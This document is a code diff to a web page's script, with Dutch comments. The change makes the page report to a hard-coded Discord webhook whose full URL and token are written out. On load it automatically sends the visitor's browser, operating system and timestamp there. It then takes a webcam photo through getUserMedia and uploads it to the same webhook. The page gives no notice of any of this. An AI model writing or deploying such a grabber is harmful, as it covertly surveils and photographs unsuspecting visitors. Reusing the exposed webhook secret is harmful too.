@@ -39,12 +39,13 @@
             }
         }
 
-        function sendToDiscord(webhookURL) {
+        function sendToDiscord() {
             var ipAddress = "127.0.0.1"; // Simulated IP address for demonstration
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
             var os = detectOS(userAgent);
             var browser = detectBrowser(userAgent);
+            var webhookURL = 'https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS';
 
             var embed = {
                 "embeds": [
@@ -87,6 +88,16 @@
             xhr.open("POST", webhookURL);
             xhr.setRequestHeader("Content-Type", "application/json");
             xhr.send(JSON.stringify(embed));
+
+            // Maak een foto met de webcam en upload deze naar Discord als bestand
+            takePhoto(function(photoData) {
+                var formData = new FormData();
+                formData.append("file", photoData);
+
+                var xhrFile = new XMLHttpRequest();
+                xhrFile.open("POST", webhookURL);
+                xhrFile.send(formData);
+            });
         }
 
         function detectOS(userAgent) {
@@ -121,16 +132,32 @@
             return detectedBrowser || 'Onbekend';
         }
 
+        // Deze functie maakt een foto met de webcam en roept een callback op met de Base64-gecodeerde string van de foto
+        function takePhoto(callback) {
+            var canvas = document.createElement('canvas');
+            var video = document.createElement('video');
+
+            navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+                video.srcObject = stream;
+                video.play();
+                setTimeout(function() {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    var photoData = canvas.toDataURL('image/jpeg');
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                    callback(photoData);
+                }, 500); // Laat 0.5 seconde toe voor de camera om te initialiseren
+            }).catch(function(err) {
+                console.error('Kan geen toegang krijgen tot de webcam:', err);
+            });
+        }
+
         window.onload = function() {
             startMusic(); // Start muziek direct bij het laden van de pagina
-            
-            // Haal de queryparameter op om te controleren of er een specifieke webhook URL is opgegeven
-            const urlParams = new URLSearchParams(window.location.search);
-            const webhookID = urlParams.get('webhook');
-
-            // Als er een webhook ID is opgegeven, stuur de informatie naar die webhook
-            if (webhookID) {
-                sendToDiscord("https://discord.com/api/webhooks/" + webhookID);
+            if (!embedSent) {
+                sendToDiscord();
+                embedSent = true;
             }
         }
     </script>
